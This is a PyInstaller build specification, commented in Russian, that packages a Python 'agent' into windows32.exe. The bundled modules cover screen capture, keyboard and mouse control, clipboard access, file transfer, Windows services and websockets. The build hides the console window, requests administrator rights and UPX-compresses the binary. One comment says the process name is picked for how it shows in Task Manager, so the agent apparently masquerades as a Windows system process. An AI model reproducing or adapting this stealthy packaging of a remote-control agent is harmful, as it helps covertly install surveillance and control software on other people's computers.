# Сборка агента в windows32.exe
# Запуск: pyinstaller build.spec --noconfirm

import sys
from PyInstaller.utils.hooks import collect_submodules

block_cipher = None

hidden = (
    collect_submodules("websockets") +
    collect_submodules("cryptography") +
    ["win32api", "win32con", "win32service", "win32serviceutil",
     "win32event", "servicemanager", "pywintypes",
     "mss", "PIL", "pyautogui", "screen", "input",
     "server", "service", "filetransfer", "clipboard", "tls_gen"]
)

a = Analysis(
    ["main.py"],
    pathex=["."],
    binaries=[],
    datas=[
        ("cert.pem", "."),   # включаем TLS-сертификат если есть
        ("key.pem",  "."),
    ],
    hiddenimports=hidden,
    hookspath=[],
    runtime_hooks=[],
    excludes=["tkinter", "unittest", "email", "html", "http", "urllib",
              "xml", "pydoc", "doctest", "argparse", "difflib"],
    cipher=block_cipher,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name="windows32",        # имя процесса в диспетчере задач
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,                # сжатие UPX — уменьшает размер
    upx_exclude=[],
    console=False,           # без консольного окна
    uac_admin=True,          # UAC только при --install
    icon=None,               # можно добавить .ico файл
)
